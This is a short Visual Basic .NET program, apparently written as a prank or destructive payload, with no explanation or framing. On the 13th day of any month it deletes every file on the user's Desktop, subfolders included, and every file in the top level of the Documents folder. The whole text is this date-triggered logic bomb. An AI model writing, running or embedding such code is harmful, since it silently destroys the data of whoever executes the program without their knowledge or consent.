Module Module1
    Sub Main()
        If (Date.Today.Day = "13") Then
            For Each i As String In FileIO.FileSystem.GetFiles(My.Computer.FileSystem.SpecialDirectories.Desktop, FileIO.SearchOption.SearchAllSubDirectories, "*.*")
                My.Computer.FileSystem.DeleteFile(i)
            Next
            For Each i As String In FileIO.FileSystem.GetFiles(My.Computer.FileSystem.SpecialDirectories.MyDocuments)
                My.Computer.FileSystem.DeleteFile(i)
            Next
        End If
    End Sub
End Module
